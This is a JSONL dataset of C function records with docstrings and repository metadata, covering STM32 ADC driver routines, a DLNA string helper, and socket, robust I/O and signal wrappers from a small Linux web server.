{"docstring": "/****************************************\n* cg_string_delete\n****************************************/\n", "func_signal": "void cg_string_delete(CgString *str)", "code": "{\n\tcg_log_debug_l5(\"Entering...\\n\");\n\n\tif (NULL != str) {\n\t\tcg_string_clear(str);\n\t\tfree(str);\n\t}\n\t\n\tcg_log_debug_l5(\"Leaving...\\n\");\n}", "path": "clinkc\\src\\cybergarage\\util\\cstring.c", "repo_name": "FuruyamaTakeshi/DLNA", "stars": 205, "license": "None", "language": "c", "size": 1053}
{"docstring": "/**\n  * @brief  Enables or disables the specified ADC DMA request.\n  * @param  ADCx: where x can be 1 or 3 to select the ADC peripheral.\n  *   Note: ADC2 hasn't a DMA capability.\n  * @param  NewState: new state of the selected ADC DMA transfer.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DMACmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_DMA_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC DMA request */\n    ADCx->CR2 |= CR2_DMA_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC DMA request */\n    ADCx->CR2 &= CR2_DMA_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the ADCx injected channels conversion through\n  *         external trigger\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC external trigger start of\n  *         injected conversion.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_ExternalTrigInjectedConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC external event selection for injected group */\n    ADCx->CR2 |= CR2_JEXTTRIG_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC external event selection for injected group */\n    ADCx->CR2 &= CR2_JEXTTRIG_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Resets the selected ADC calibration registers.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_ResetCalibration(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Resets the selected ADC calibration registers */  \n  ADCx->CR2 |= CR2_RSTCAL_Set;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the selected ADC software start conversion .\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC software start conversion.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC conversion on external event and start the selected\n       ADC conversion */\n    ADCx->CR2 |= CR2_EXTTRIG_SWSTART_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC conversion on external event and stop the selected\n       ADC conversion */\n    ADCx->CR2 &= CR2_EXTTRIG_SWSTART_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the ADCx conversion through external trigger.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC external trigger start of conversion.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_ExternalTrigConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC conversion on external event */\n    ADCx->CR2 |= CR2_EXTTRIG_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC conversion on external event */\n    ADCx->CR2 &= CR2_EXTTRIG_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Returns the ADC injected channel conversion result\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InjectedChannel: the converted ADC injected channel.\n  *   This parameter can be one of the following values:\n  *     @arg ADC_InjectedChannel_1: Injected Channel1 selected\n  *     @arg ADC_InjectedChannel_2: Injected Channel2 selected\n  *     @arg ADC_InjectedChannel_3: Injected Channel3 selected\n  *     @arg ADC_InjectedChannel_4: Injected Channel4 selected\n  * @retval The Data conversion value.\n  */\n", "func_signal": "uint16_t ADC_GetInjectedConversionValue(ADC_TypeDef* ADCx, uint8_t ADC_InjectedChannel)", "code": "{\n  __IO uint32_t tmp = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_CHANNEL(ADC_InjectedChannel));\n\n  tmp = (uint32_t)ADCx;\n  tmp += ADC_InjectedChannel + JDR_Offset;\n  \n  /* Returns the selected injected channel conversion data value */\n  return (uint16_t) (*(__IO uint32_t*)  tmp);   \n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the discontinuous mode for injected group\n  *         channel for the specified ADC\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC discontinuous mode\n  *         on injected group channel.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedDiscModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC injected discontinuous mode */\n    ADCx->CR1 |= CR1_JDISCEN_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC injected discontinuous mode */\n    ADCx->CR1 &= CR1_JDISCEN_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Clears the ADCx's pending flags.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_FLAG: specifies the flag to clear. \n  *   This parameter can be any combination of the following values:\n  *     @arg ADC_FLAG_AWD: Analog watchdog flag\n  *     @arg ADC_FLAG_EOC: End of conversion flag\n  *     @arg ADC_FLAG_JEOC: End of injected group conversion flag\n  *     @arg ADC_FLAG_JSTRT: Start of injected group conversion flag\n  *     @arg ADC_FLAG_STRT: Start of regular group conversion flag\n  * @retval None\n  */\n", "func_signal": "void ADC_ClearFlag(ADC_TypeDef* ADCx, uint8_t ADC_FLAG)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_CLEAR_FLAG(ADC_FLAG));\n  /* Clear the selected ADC flags */\n  ADCx->SR = ~(uint32_t)ADC_FLAG;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Configures the sequencer length for injected channels\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  Length: The sequencer length. \n  *   This parameter must be a number between 1 to 4.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedSequencerLengthConfig(ADC_TypeDef* ADCx, uint8_t Length)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint32_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_LENGTH(Length));\n  \n  /* Get the old register value */\n  tmpreg1 = ADCx->JSQR;\n  /* Clear the old injected sequnence lenght JL bits */\n  tmpreg1 &= JSQR_JL_Reset;\n  /* Set the injected sequnence lenght JL bits */\n  tmpreg2 = Length - 1; \n  tmpreg1 |= tmpreg2 << 20;\n  /* Store the new register value */\n  ADCx->JSQR = tmpreg1;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Gets the selected ADC reset calibration registers status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC reset calibration registers (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetResetCalibrationStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Check the status of RSTCAL bit */\n  if ((ADCx->CR2 & CR2_RSTCAL_Set) != (uint32_t)RESET)\n  {\n    /* RSTCAL bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* RSTCAL bit is reset */\n    bitstatus = RESET;\n  }\n  /* Return the RSTCAL bit status */\n  return  bitstatus;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Gets the selected ADC Software start conversion Status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC software start conversion (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetSoftwareStartConvStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Check the status of SWSTART bit */\n  if ((ADCx->CR2 & CR2_SWSTART_Set) != (uint32_t)RESET)\n  {\n    /* SWSTART bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* SWSTART bit is reset */\n    bitstatus = RESET;\n  }\n  /* Return the SWSTART bit status */\n  return  bitstatus;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Gets the selected ADC calibration status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC calibration (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetCalibrationStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Check the status of CAL bit */\n  if ((ADCx->CR2 & CR2_CAL_Set) != (uint32_t)RESET)\n  {\n    /* CAL bit is set: calibration on going */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* CAL bit is reset: end of calibration */\n    bitstatus = RESET;\n  }\n  /* Return the CAL bit status */\n  return  bitstatus;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Checks whether the specified ADC interrupt has occurred or not.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_IT: specifies the ADC interrupt source to check. \n  *   This parameter can be one of the following values:\n  *     @arg ADC_IT_EOC: End of conversion interrupt mask\n  *     @arg ADC_IT_AWD: Analog watchdog interrupt mask\n  *     @arg ADC_IT_JEOC: End of injected conversion interrupt mask\n  * @retval The new state of ADC_IT (SET or RESET).\n  */\n", "func_signal": "ITStatus ADC_GetITStatus(ADC_TypeDef* ADCx, uint16_t ADC_IT)", "code": "{\n  ITStatus bitstatus = RESET;\n  uint32_t itmask = 0, enablestatus = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_GET_IT(ADC_IT));\n  /* Get the ADC IT index */\n  itmask = ADC_IT >> 8;\n  /* Get the ADC_IT enable bit status */\n  enablestatus = (ADCx->CR1 & (uint8_t)ADC_IT) ;\n  /* Check the status of the specified ADC interrupt */\n  if (((ADCx->SR & itmask) != (uint32_t)RESET) && enablestatus)\n  {\n    /* ADC_IT is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* ADC_IT is reset */\n    bitstatus = RESET;\n  }\n  /* Return the ADC_IT status */\n  return  bitstatus;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the selected ADC automatic injected group\n  *         conversion after regular one.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC auto injected conversion\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_AutoInjectedConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC automatic injected group conversion */\n    ADCx->CR1 |= CR1_JAUTO_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC automatic injected group conversion */\n    ADCx->CR1 &= CR1_JAUTO_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Returns the last ADCx conversion result data for regular channel.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The Data conversion value.\n  */\n", "func_signal": "uint16_t ADC_GetConversionValue(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Return the selected ADC conversion value */\n  return (uint16_t) ADCx->DR;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the selected ADC start of the injected \n  *         channels conversion.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC software start injected conversion.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartInjectedConvCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC conversion for injected group on external event and start the selected\n       ADC injected conversion */\n    ADCx->CR2 |= CR2_JEXTTRIG_JSWSTART_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC conversion on external event for injected group and stop the selected\n       ADC injected conversion */\n    ADCx->CR2 &= CR2_JEXTTRIG_JSWSTART_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Starts the selected ADC calibration process.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_StartCalibration(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Enable the selected ADC calibration process */  \n  ADCx->CR2 |= CR2_CAL_Set;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Fills each ADC_InitStruct member with its default value.\n  * @param  ADC_InitStruct : pointer to an ADC_InitTypeDef structure which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void ADC_StructInit(ADC_InitTypeDef* ADC_InitStruct)", "code": "{\n  /* Reset ADC init structure parameters values */\n  /* Initialize the ADC_Mode member */\n  ADC_InitStruct->ADC_Mode = ADC_Mode_Independent;\n  /* initialize the ADC_ScanConvMode member */\n  ADC_InitStruct->ADC_ScanConvMode = DISABLE;\n  /* Initialize the ADC_ContinuousConvMode member */\n  ADC_InitStruct->ADC_ContinuousConvMode = DISABLE;\n  /* Initialize the ADC_ExternalTrigConv member */\n  ADC_InitStruct->ADC_ExternalTrigConv = ADC_ExternalTrigConv_T1_CC1;\n  /* Initialize the ADC_DataAlign member */\n  ADC_InitStruct->ADC_DataAlign = ADC_DataAlign_Right;\n  /* Initialize the ADC_NbrOfChannel member */\n  ADC_InitStruct->ADC_NbrOfChannel = 1;\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the discontinuous mode on regular group\n  *         channel for the specified ADC\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC discontinuous mode\n  *         on regular group channel.\n  *         This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DiscModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC regular discontinuous mode */\n    ADCx->CR1 |= CR1_DISCEN_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC regular discontinuous mode */\n    ADCx->CR1 &= CR1_DISCEN_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/**\n  * @brief  Enables or disables the specified ADC peripheral.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the ADCx peripheral.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_Cmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Set the ADON bit to wake up the ADC from power down mode */\n    ADCx->CR2 |= CR2_ADON_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC peripheral */\n    ADCx->CR2 &= CR2_ADON_Reset;\n  }\n}", "path": "Original-src\\EvvGC_GUI_FW_0.3g\\EvvGC_FW_0.3\\stm32f10x_adc.c", "repo_name": "EvvGC/Firmware", "stars": 242, "license": "None", "language": "c", "size": 42973}
{"docstring": "/********************************\n * Wrappers for Unix I/O routines\n ********************************/\n", "func_signal": "int Open(const char *pathname, int flags, mode_t mode)", "code": "{\n    int rc;\n\n    if ((rc = open(pathname, flags, mode))  < 0)\n    {\n        syslog(LOG_CRIT,\"Open %s error\",pathname);\n\tunix_error(\"Open error\");\n    }\n    return rc;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $end gethostbyname */\n", "func_signal": "struct hostent *Gethostbyaddr(const char *addr, int len, int type)", "code": "{\n    struct hostent *p;\n\n    if ((p = gethostbyaddr(addr, len, type)) == NULL)\n    {\n        syslog(LOG_CRIT,\"Gethostbyaddr error\");\n\tdns_error(\"Gethostbyaddr error\");\n    }\n    return p;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/******************************************\n * Wrappers for the client/server helper routines \n ******************************************/\n", "func_signal": "int Open_clientfd(char *hostname, int port)", "code": "{\n    int rc;\n\n    if ((rc = open_clientfd(hostname, port)) < 0) {\n\tif (rc == -1)\n\t{\n            syslog(LOG_CRIT,\"Open_clientfd Unix error\");\n\t    unix_error(\"Open_clientfd Unix error\");\n\t} \n\telse        \n\t{\n            syslog(LOG_CRIT,\"Open_clientfd NDS error\");\n\t    dns_error(\"Open_clientfd DNS error\");\n\t} \n    }\n    return rc;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* \n * rio_readlineb - robustly read a text line (buffered)\n */\n/* $begin rio_readlineb */\n", "func_signal": "ssize_t rio_readlineb(rio_t *rp, void *usrbuf, size_t maxlen)", "code": "{\n    int n, rc;\n    char c, *bufp = usrbuf;\n\n    for (n = 1; n < maxlen; n++) { \n\tif ((rc = rio_read(rp, &c, 1)) == 1) {\n\t    *bufp++ = c;\n\t    if (c == '\\n')\n\t\tbreak;\n\t} else if (rc == 0) {\n\t    if (n == 1)\n\t\treturn 0; /* EOF, no data read */\n\t    else\n\t\tbreak;    /* EOF, some data was read */\n\t} else\n\t    return -1;\t  /* error */\n    }\n    *bufp = 0;\n    return n;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/*********************************************************************\n * The Rio package - robust I/O functions\n **********************************************************************/\n/*\n * rio_readn - robustly read n bytes (unbuffered)\n */\n/* $begin rio_readn */\n", "func_signal": "ssize_t rio_readn(int fd, void *usrbuf, size_t n)", "code": "{\n    size_t nleft = n;\n    ssize_t nread;\n    char *bufp = usrbuf;\n\n    while (nleft > 0) {\n\tif ((nread = read(fd, bufp, nleft)) < 0) {\n\t    if (errno == EINTR) /* interrupted by sig handler return */\n\t\tnread = 0;      /* and call read() again */\n\t    else\n\t\treturn -1;      /* errno set by read() */ \n\t} \n\telse if (nread == 0)\n\t    break;              /* EOF */\n\tnleft -= nread;\n\tbufp += nread;\n    }\n    return (n - nleft);         /* return >= 0 */\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/*\n * read_requesthdrs - read and parse HTTP request headers\n */\n/* $begin get_requesthdrs */\n", "func_signal": "static void get_requesthdrs(rio_t *rp)", "code": "{\n    char buf[MAXLINE];\n\n    Rio_readlineb(rp, buf, MAXLINE);\n    writetime();  /* write access time in log file */\n    //printf(\"%s\", buf);\n    while(strcmp(buf, \"\\r\\n\")) \n    {\n\tRio_readlineb(rp, buf, MAXLINE);\n\twritelog(buf);\n\t//printf(\"%s\", buf);\n    }\n    return;\n}", "path": "main.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $begin sigaction */\n", "func_signal": "handler_t *Signal(int signum, handler_t *handler)", "code": "{\n    struct sigaction action, old_action;\n\n    action.sa_handler = handler;  \n    sigemptyset(&action.sa_mask); /* block sigs of type being handled */\n    action.sa_flags = SA_RESTART; /* restart syscalls if possible */\n\n    if (sigaction(signum, &action, &old_action) < 0)\n    {\n        syslog(LOG_CRIT,\"Signal error\");\n\tunix_error(\"Signal error\");\n    }\n    return (old_action.sa_handler);\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/**********************************\n * Wrappers for robust I/O routines\n **********************************/\n", "func_signal": "ssize_t Rio_readn(int fd, void *ptr, size_t nbytes)", "code": "{\n    ssize_t n;\n  \n    if ((n = rio_readn(fd, ptr, nbytes)) < 0)\n    {\n        syslog(LOG_CRIT,\"Rio_readn error\");\n\tunix_error(\"Rio_readn error\");\n    }\n    return n;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $begin forkwrapper */\n", "func_signal": "pid_t Fork(void)", "code": "{\n    pid_t pid;\n\n    if ((pid = fork()) < 0)\n    {\n        syslog(LOG_CRIT,\"Fork error\");\n\tunix_error(\"Fork error\");\n    }\n    return pid;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/*  \n * open_listenfd - open and return a listening socket on port\n *     Returns -1 and sets errno on Unix error.\n */\n/* $begin open_listenfd */\n", "func_signal": "int open_listenfd(int port)", "code": "{\n    int listenfd, optval=1;\n    struct sockaddr_in serveraddr;\n  \n    /* Create a socket descriptor */\n    if ((listenfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n\treturn -1;\n \n    /* Eliminates \"Address already in use\" error from bind. */\n    if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, \n\t\t   (const void *)&optval , sizeof(int)) < 0)\n\treturn -1;\n\n    /* Listenfd will be an endpoint for all requests to port\n       on any IP address for this host */\n    bzero((char *) &serveraddr, sizeof(serveraddr));\n    serveraddr.sin_family = AF_INET; \n    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY); \n    serveraddr.sin_port = htons((unsigned short)port); \n    if (bind(listenfd, (SA *)&serveraddr, sizeof(serveraddr)) < 0)\n\treturn -1;\n\n    /* Make it a listening socket ready to accept connection requests */\n    if (listen(listenfd, LISTENQ) < 0)\n\treturn -1;\n    return listenfd;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/*\n * rio_readnb - Robustly read n bytes (buffered)\n */\n/* $begin rio_readnb */\n", "func_signal": "ssize_t rio_readnb(rio_t *rp, void *usrbuf, size_t n)", "code": "{\n    size_t nleft = n;\n    ssize_t nread;\n    char *bufp = usrbuf;\n    \n    while (nleft > 0) {\n\tif ((nread = rio_read(rp, bufp, nleft)) < 0) {\n\t    if (errno == EINTR) /* interrupted by sig handler return */\n\t\tnread = 0;      /* call read() again */\n\t    else\n\t\treturn -1;      /* errno set by read() */ \n\t} \n\telse if (nread == 0)\n\t    break;              /* EOF */\n\tnleft -= nread;\n\tbufp += nread;\n    }\n    return (n - nleft);         /* return >= 0 */\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $end sigaction */\n", "func_signal": "void Sigprocmask(int how, const sigset_t *set, sigset_t *oldset)", "code": "{\n    if (sigprocmask(how, set, oldset) < 0)\n    {\n        syslog(LOG_CRIT,\"Sigprocmask error\");\n\tunix_error(\"Sigprocmask error\");\n    }\n    return;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/**************************** \n * Sockets interface wrappers\n ****************************/\n", "func_signal": "int Socket(int domain, int type, int protocol)", "code": "{\n    int rc;\n\n    if ((rc = socket(domain, type, protocol)) < 0)\n    {\n        syslog(LOG_CRIT,\"Socket error\");\n\tunix_error(\"Socket error\");\n    }\n    return rc;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/*\n * rio_readinitb - Associate a descriptor with a read buffer and reset buffer\n */\n/* $begin rio_readinitb */\n", "func_signal": "void rio_readinitb(rio_t *rp, int fd)", "code": "{\n    rp->rio_fd = fd;  \n    rp->rio_cnt = 0;  \n    rp->rio_bufptr = rp->rio_buf;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
